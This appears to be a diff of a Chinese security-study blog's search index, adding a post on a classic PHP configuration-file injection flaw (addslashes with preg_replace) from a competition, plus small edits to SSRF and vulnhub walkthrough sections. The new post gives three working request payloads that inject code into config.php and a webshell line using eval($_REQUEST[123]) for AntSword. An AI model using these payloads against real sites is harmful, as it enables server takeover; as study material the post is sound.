@@ -130,7 +130,7 @@
 <p>7.无视cdn</p>
 <p>8.利用Redis未授权访问，HTTP CRLF注入实现getshell</p>
 <h4 id="3-防御-4"><a href="#3-防御-4" class="headerlink" title="3.防御"></a>3.防御</h4><p>① 限制请求的端口只能为web端口，只允许访问HTTP和HTTPS请求。<br>② 限制不能访问内网的IP，以防止对内网进行攻击。<br>③ 屏蔽返回的详细信息。<br>④ 限制请求的端口为HTTP常用的端口，比如 80,443,8080,8088等。</p>
-<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">PHP中下面函数的使用不当会导致SSRF:</span><br><span class="line"><span class="function"><span class="title">file_get_contents</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">fsockopen</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">curl_exec</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">PHP中下面函数的使用不当会导致SSRF:</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">file_get_contents</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">fsockopen</span><span class="params">()</span></span> </span><br><span class="line">在PHP中fsockopen函数的作用是打开一个网络连接或者一个Unix套接字连接，其语法为“<span class="built_in">fsockopen</span>(<span class="variable">$hostname</span>) ”，返回值为一个文件句柄，之后可以被其他文件类函数调用</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">curl_exec</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>
 
 <hr>
 <h3 id="文件上传漏洞篇"><a href="#文件上传漏洞篇" class="headerlink" title="文件上传漏洞篇"></a>文件上传漏洞篇</h3><h4 id="1-文件上传漏洞原理"><a href="#1-文件上传漏洞原理" class="headerlink" title="1.文件上传漏洞原理"></a>1.文件上传漏洞原理</h4><p>就是未对用户上传的文件进行检查和过滤，导致某些别有用心的用户上传了一些恶意代码或文件（<code>asp、php、jsp</code>等），从而控制了网站。（当文件上传时，如果服务端的脚本语言没有对上传的文件进行检查和过滤，那假如，渗透者直接上传恶意代码文件，那么就有可能直接控制整个网站，或者说以此为跳板，直接拿下服务器，这就是文件上传漏洞。）</p>
@@ -2906,7 +2906,7 @@ handler 指向RequestHandler
 <p>发现其目录下的<code>kira.txt</code>设置了权限</p>
 <p>我们尝试用之前后台登录的密码登录，也失败了</p>
 <h2 id="3-登录kira"><a href="#3-登录kira" class="headerlink" title="3.登录kira"></a>3.登录kira</h2><p>看来我们还需要找找信息，根据<code>user.txt</code>文本信息，我们必须要成功登录<code>kira</code>的用户，才可以提权拿到我们想要的东西</p>
-<p>那我们直接搜索当前全部一起有kira的文件或者目录</p>
+<p>那我们直接搜索当前全部含有kira的文件或者目录</p>
 <figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -name <span class="string">&quot;kira*&quot;</span> <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/29/vulnhub/image-20221108222721847.png" alt="image-20221108222721847"></p>
@@ -2990,7 +2990,7 @@ handler 指向RequestHandler
         <category>网络安全学习</category>
       </categories>
       <tags>
-        <tag>线下靶场</tag>
+        <tag>实战</tag>
       </tags>
   </entry>
   <entry>
@@ -3124,6 +3124,79 @@ handler 指向RequestHandler
       </categories>
       <tags>
         <tag>二进制</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>漏洞学习</title>
+    <url>/2022/11/10/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h1 id="1-PHP写入配置文件的经典漏洞"><a href="#1-PHP写入配置文件的经典漏洞" class="headerlink" title="1.PHP写入配置文件的经典漏洞"></a>1.PHP写入配置文件的经典漏洞</h1><p>在一个比赛中了解到的一个漏洞，关键在于绕过函数从而包含</p>
+<p><a href="https://bbs.zkaq.cn/t/6045.html">转载文章</a></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">`<span class="meta">&lt;?php</span>`</span><br><span class="line">`<span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;option&#x27;</span>])) <span class="keyword">die</span>();</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;option&#x27;</span>]);`</span><br><span class="line">`<span class="variable">$file</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./config.php&#x27;</span>);`</span><br><span class="line">`<span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;|\$option=\&#x27;.*\&#x27;;|&#x27;</span>, <span class="string">&quot;\$option=&#x27;<span class="subst">$str</span>&#x27;;&quot;</span>, <span class="variable">$file</span>);`</span><br><span class="line">`<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./config.php&#x27;</span>, <span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>
+
+
+<p><code>config.php</code> 的内容如下:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;test&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+
+<p>要求是要<code>getshell</code>,这个场景十分经典，常用在修改配置文件写入的时候。<br>此处不存在之前说的那个配置文件中用的是<code>”双引号”</code>引起任意代码执行的问题,这这里面用的是单引号,而且 <code>addslashes()</code>处理过了,看似很安全,但是对于脑子里有个黑洞的搞安全的人来讲,这个还真是有问题的.</p>
+<h2 id="方法一-利用换行符来绕过正则匹配的问题"><a href="#方法一-利用换行符来绕过正则匹配的问题" class="headerlink" title="方法一,利用换行符来绕过正则匹配的问题"></a>方法一,利用换行符来绕过正则匹配的问题</h2><p>可以看到正则匹配的是以下内容:</p>
+<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="symbol">$optio</span>n=<span class="string">&#x27;任意内容&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>任意内容里面是可以包含转移符 <code>\</code> 的,所以我们利用下面的方法:</p>
+<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//127.0.0.1/index.php?option=a&#x27;;%0aphpinfo();//</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//127.0.0.1/index.php?option=a</span></span><br></pre></td></tr></table></figure>
+
+
+<p>执行完第一个之后,<code>config.php</code>中的内容为:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;a\&#x27;;</span></span><br><span class="line"><span class="string">phpinfo();//&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>但是这样并没有办法执行<code>phpinfo()</code>,因为我们插入的 单引号 被转移掉了,所以<code>phpinfo()</code>还是在单引号的包裹之内.<br>我们在访问下面这个</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span>/index.php?option=a</span><br></pre></td></tr></table></figure>
+
+
+<p>因为正则 <code>.*</code> 会匹配行内的任意字符无数次.所以 <code>\</code> 也被认为是其中的一部分,也会被替换掉,执行完之后,<code>config.php</code>中的内容为:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();<span class="comment">//&#x27;;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>转义符就被替换掉了,就成功的<code>getshell</code>.</p>
+<h2 id="方法二-利用-preg-replace函数的问题"><a href="#方法二-利用-preg-replace函数的问题" class="headerlink" title="方法二,利用 preg_replace函数的问题:"></a>方法二,利用 preg_replace函数的问题:</h2><p>用<code>preg_replace()</code>的时候<code>replacement(第二个参数)</code>也要经过正则引擎处理，所以正则引擎把<code>\\</code>转义成了<code>\</code><br>也就是说如果字符串是<code>\\\&amp;#39;</code>,经过 <code>preg_replace()</code>的处理,就变为 <code>#39;</code>,单引号就逃出来了.<br>所以<code>payload</code>如下:</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/index.php?option=a\&#x27;;phpinfo();/</span><span class="regexp">/</span></span><br></pre></td></tr></table></figure>
+
+
+<p><code>config.php</code>变为:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;a\\&#x27;</span>;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">//&#x27;;</span></span><br></pre></td></tr></table></figure>
+
+<p>**道理就是  <code>a\&amp;#39;;phpinfo();//</code>  经过 <code>addslashes()</code>处理之后,变为<code>a\\\&amp;#39;;phpinfo();//</code> 然后两个反斜杠被<code>preg_replace</code>变成了一个,导致单引号逃脱.</p>
+<h2 id="方法三-利用-preg-replace-函数的第二个参数的问题"><a href="#方法三-利用-preg-replace-函数的第二个参数的问题" class="headerlink" title="方法三, 利用 preg_replace() 函数的第二个参数的问题"></a>方法三, 利用 preg_replace() 函数的第二个参数的问题</h2><p>先看官方对<code>preg_replace()</code>函数的描述<code>manual</code><br>函数原型:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">xed <span class="title function_ invoke__">preg_replace</span> ( <span class="keyword">mixed</span> <span class="variable">$pattern</span> , <span class="keyword">mixed</span> <span class="variable">$replacement</span> , <span class="keyword">mixed</span> <span class="variable">$subject</span> [, <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span> [, <span class="keyword">int</span> &amp;<span class="variable">$count</span> ]] )</span><br></pre></td></tr></table></figure>
+
+
+<p>对<code>replacement</code>的描述.<br><code>replacement</code>中可以包含后</p>
+<p>向<code>引用\\n或(php 4.0.4以上可用)$n</code>，语法上首选后者。 每个 这样的引用将被匹配到的第<code>n</code>个捕获子组捕获到的文本替换。 <code>n</code> 可以是<code>0-99</code>，<code>\\0</code>和<code>$0</code>代表完整的模式匹配文本。</p>
+<p>所以我们可以用:</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/test/</span>ph.php?option=;phpinfo();</span><br><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/test/</span>ph.php?option= 或者 http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/test/</span>ph.php?option=<span class="variable">$0</span></span><br></pre></td></tr></table></figure>
+
+
+<p>执行第一条后<code>config.php</code>的内容为:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;;phpinfo();&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+
+<p>再执行第二条后<code>config.php</code>的内容为:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;$option=&#x27;</span>;<span class="title function_ invoke__">phpinfo</span>();<span class="string">&#x27;;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+
+<p>刚好闭合掉了前后的两个单引号中间的逃脱出来了.想出这个办法的人,思路真是可以的.</p>
+<hr>
+<p>要<code>getshell</code>直接</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">把<span class="built_in">phpinfo</span>()替换成</span><br><span class="line"><span class="function"><span class="title">eval</span><span class="params">($_REQUEST[<span class="number">123</span>])</span></span></span><br><span class="line"><span class="function"><span class="title">assert</span><span class="params">($_REQUEST[<span class="number">123</span>])</span></span></span><br><span class="line">蚁剑连接即可</span><br></pre></td></tr></table></figure>
+
+<hr>
+]]></content>
+      <categories>
+        <category>网络安全学习</category>
+      </categories>
+      <tags>
+        <tag>实战</tag>
       </tags>
   </entry>
   <entry>
